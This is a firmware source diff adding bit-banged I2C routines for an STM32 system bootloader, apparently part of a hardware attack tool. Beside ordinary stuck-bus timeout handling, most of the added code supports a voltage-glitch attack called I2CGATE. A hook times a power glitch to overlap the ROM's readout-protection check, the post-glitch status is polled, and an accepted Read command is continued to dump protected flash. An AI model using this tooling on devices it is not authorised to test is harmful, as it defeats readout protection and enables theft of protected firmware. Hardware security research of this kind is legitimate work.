@@ -34,8 +34,17 @@ static inline bool scl_hi(void) {                 // release + honour clock-stre
     return true;
 }
 
-static void i2c_pins_init(void) {
-    gpio_deinit(I2C_SCL_PIN);
+static void i2c_pins_init(void);
+void i2c_pins_reinit(void);
+
+// Re-init GP4/GP5 as the bit-banged I2C master without touching target state —
+// used by ROMFPB, which drives the boot sequence itself and must NOT call
+// i2c_bl_enter() (that would POR away the FPB patch it just armed).
+void i2c_pins_reinit(void) {
+    i2c_pins_init();
+}
+
+static void i2c_pins_init(void) {    gpio_deinit(I2C_SCL_PIN);
     gpio_deinit(I2C_SDA_PIN);
     gpio_init(I2C_SCL_PIN);
     gpio_init(I2C_SDA_PIN);
@@ -86,16 +95,89 @@ static uint8_t i2c_rd(bool send_ack) {
 #define ADDR_W(a) ((uint8_t)((a) << 1))
 #define ADDR_R(a) ((uint8_t)(((a) << 1) | 1))
 
+// Between transfers the bus must idle high (open-drain + pull-ups). If SCL won't
+// rise, the slave is stuck/absent with the line held low and every remaining bit
+// would burn the full 80ms stretch timeout — and a low SDA during the ACK slot
+// reads as a false "ACK", so the retry loop would spin ~5min per command instead
+// of failing. Fail fast instead.
+static bool i2c_scl_free(void) {
+    uint64_t t = time_us_64();
+    while (!gpio_get(I2C_SCL_PIN)) {
+        // must exceed the F401's measured worst-case legit stretch (~17ms) or we
+        // false-flag a healthy stretching slave; still bounds a silent-slave
+        // bl_wait_ack loop to ~8s instead of ~5min.
+        if (time_us_64() - t > 25000) return false;  // 25ms grace, then declare stuck
+    }
+    return true;
+}
+
 // AN4221: after a command the device is polled by repeating (START + read-addr);
 // it NACKs its address while busy, ACKs when ready, then returns the status byte.
 static bool bl_wait_ack(uint8_t a, int retries) {
     for (int r = 0; r < retries; r++) {
+        if (!i2c_scl_free()) {
+            uart_cli_send("    (I2C bus stuck: SCL held low — aborting wait)\r\n");
+            return false;
+        }
         i2c_start();
         bool addr_ok = i2c_wr(ADDR_R(a));
         if (addr_ok) {
             uint8_t s = i2c_rd(false);
             i2c_stop();
             return s == BL_ACK;
+        }
+        i2c_stop();
+        sleep_us(200);
+    }
+    return false;
+}
+
+// Send the command frame with a hook fired AFTER the command byte's byte-level
+// ACK and BEFORE the complement byte is sent — i.e. while the ROM is about to
+// validate cmd/~cmd and run its post-command processing (the RDP check for
+// gated commands). The hook is where I2CGATE fires its power glitch so the dip
+// overlaps the check instead of landing after the verdict has latched.
+bool i2c_bl_cmd_with_hook(uint8_t a, uint8_t cmd, void (*hook)(void), void (*hook2)(void)) {
+    i2c_start();
+    bool addr_ok = i2c_wr(ADDR_W(a));
+    sleep_us(1000);
+    i2c_wr(cmd);
+    if (hook) hook();                  // glitch window 1: after cmd byte
+    sleep_us(200);
+    i2c_wr((uint8_t)(cmd ^ 0xFF));
+    if (hook2) hook2();                // glitch window 2: after ~cmd, before STOP
+    i2c_stop();
+    return addr_ok;
+}
+
+// Send the command frame and return immediately (no verdict wait) — leaves the
+// ROM inside its post-command processing, the window I2CGATE glitches into.
+bool i2c_bl_send_cmd_raw(uint8_t a, uint8_t cmd) {
+    i2c_start();
+    bool addr_ok = i2c_wr(ADDR_W(a));
+    sleep_us(1000);
+    i2c_wr(cmd);
+    sleep_us(200);
+    i2c_wr((uint8_t)(cmd ^ 0xFF));
+    i2c_stop();
+    return addr_ok;
+}
+
+// Poll the device's post-command status: repeat (START + read-addr); when the
+// address ACKs, read the status byte. *status_ack = (byte == 0x79). Returns
+// false if the bus went stuck or the device never answered within retries
+// (typically a BOR reboot from a glitch). Used by I2CGATE to classify the
+// post-glitch verdict.
+bool i2c_bl_wait_status(uint8_t a, int retries, bool *status_ack) {
+    for (int r = 0; r < retries; r++) {
+        if (!i2c_scl_free()) return false;
+        i2c_start();
+        bool ok = i2c_wr(ADDR_R(a));
+        if (ok) {
+            uint8_t s = i2c_rd(false);
+            i2c_stop();
+            if (status_ack) *status_ack = (s == BL_ACK);
+            return true;
         }
         i2c_stop();
         sleep_us(200);
@@ -279,6 +361,35 @@ bool i2c_bl_probe(uint8_t a, uint8_t cmd) {
     }
     uart_cli_printf("I2C PROBE cmd 0x%02X: %s\r\n", cmd, acc ? "ACK (accepted)" : "NACK (gated)");
     return acc;
+}
+
+// Continue an ACCEPTED 0x11 Read command: send the address frame, length
+// frame, and read back len data bytes into out[]. Used by I2CGATE after a
+// glitch-corrupted gate passed (the command is already ACKed mid-flight).
+// Returns true if all frames ACKed and len bytes were read.
+bool i2c_bl_read_frames(uint8_t a, uint32_t address, uint8_t *out, uint32_t len) {
+    uint8_t ab[4] = { (uint8_t)(address >> 24), (uint8_t)(address >> 16),
+                      (uint8_t)(address >> 8), (uint8_t)address };
+    uint8_t xsum = ab[0] ^ ab[1] ^ ab[2] ^ ab[3];
+    bool verdict = false;
+    i2c_start();
+    if (!i2c_wr(ADDR_W(a))) { i2c_stop(); return false; }
+    i2c_wr(ab[0]); i2c_wr(ab[1]); i2c_wr(ab[2]); i2c_wr(ab[3]); i2c_wr(xsum);
+    i2c_stop();
+    if (!bl_wait_ack(a, 100)) return false;
+
+    uint8_t nm1 = (uint8_t)(len - 1);
+    i2c_start();
+    if (!i2c_wr(ADDR_W(a))) { i2c_stop(); return false; }
+    i2c_wr(nm1); i2c_wr((uint8_t)(nm1 ^ 0xFF));
+    i2c_stop();
+    if (!bl_wait_ack(a, 100)) return false;
+
+    i2c_start();
+    if (!i2c_wr(ADDR_R(a))) { i2c_stop(); return false; }
+    for (uint32_t j = 0; j < len; j++) out[j] = i2c_rd(j < len - 1);
+    i2c_stop();
+    return true;
 }
 
 // 0x01 Get Version & Read Protection Status
